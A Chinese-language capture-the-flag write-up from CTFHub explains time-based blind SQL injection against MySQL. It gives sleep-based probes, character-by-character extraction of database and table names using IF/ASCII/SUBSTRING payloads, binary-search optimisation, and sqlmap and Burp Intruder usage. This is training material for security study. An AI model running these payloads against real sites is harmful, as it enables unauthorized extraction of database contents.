# 时间盲注

## 来源
CTF比赛: CTFHub
年份: 2023

## 类型
SQL Injection - Blind SQLi (Time-Based)

## 题目分析
页面没有显式回显位，但可以通过时间延迟判断条件是否成立。
适用于无法看到数据内容但可以控制响应时间的场景。

## 解题思路
1. 判断注入点：输入 `' and sleep(5)--+` 观察页面响应延迟
2. 确认数据库类型：MySQL 使用 `sleep()`，PostgreSQL 使用 `pg_sleep()`
3. 逐字符爆破数据库名：使用 `if(ascii(substr(database(),N,1))>X,sleep(3),0)`
4. 逐字符爆破表名：嵌套查询 `if(ascii(substr((select table_name from information_schema.tables limit 0,1),N,1))>X,sleep(3),0)`
5. 二分法优化比较逻辑，减少请求次数

## 使用工具
- Python（编写脚本）
- Burp Suite Intruder
- sqlmap --technique=T

## Payload
时间盲注模板：
```
' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>97,SLEEP(3),0)--+
```

爆破表名：
```
' AND IF(ASCII(SUBSTRING((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),1,1))>97,SLEEP(3),0)--+
```

## Flag获取方式
通过时间盲注逐字符爆破 flag 内容，将 ASCII 码拼接为完整字符串。

## 技术总结
关键词：时间盲注, sleep, 二分法, blind sql injection, 逐字符爆破

核心要点：
1. 使用 `sleep()` 或 `benchmark()` 制造时间差
2. 二分法将每个字符的猜测次数从 128 降到 7-8 次
3. 网络延迟会影响判断，建议 sleep 时间设为 3-5 秒
4. 可以在脚本中增加超时重试机制
5. sqlmap 的 `--technique=T` 专门用于时间盲注
